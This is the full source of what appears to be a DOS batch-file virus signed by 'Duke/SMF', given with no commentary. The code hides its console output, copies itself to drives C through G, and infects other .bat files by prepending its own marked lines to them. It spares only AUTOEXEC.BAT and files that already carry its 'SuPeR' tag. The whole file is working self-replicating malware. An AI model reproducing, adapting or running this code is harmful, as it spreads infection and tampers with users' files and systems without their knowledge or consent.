@ctty nul%SuPeR%
if "%1=="SuPeR1 goto SuPeR1
if "%1=="SuPeR2 goto SuPeR2
for %%d in (c d e f g) do call %0 SuPeR1 %%d
for %%b in (*.bat ..\*.bat) do call %0 SuPeR2 %%b
goto SuPeR4
:SuPeR1
copy %0 %2:\%0%SuPeR%
if not exist %2:\%0 goto SuPeR3
for %%b in (%2:\*.bat) do call %0 SuPeR2 %%b
goto SuPeR3
:SuPeR2
if %2==AUTOEXEC.BAT goto SuPeR3
find "SuPeR"<%2
if not errorlevel 1 goto SuPeR3
find "SuPeR"<%0>c:\SuPeR.bat
type %2>>c:\SuPeR.bat
copy c:\SuPeR.bat %2
:SuPeR3
exit %SuPeR%
:SuPeR4
del c:\SuPeR.bat
ctty con%SuPeR%
: (c) by Duke/SMF
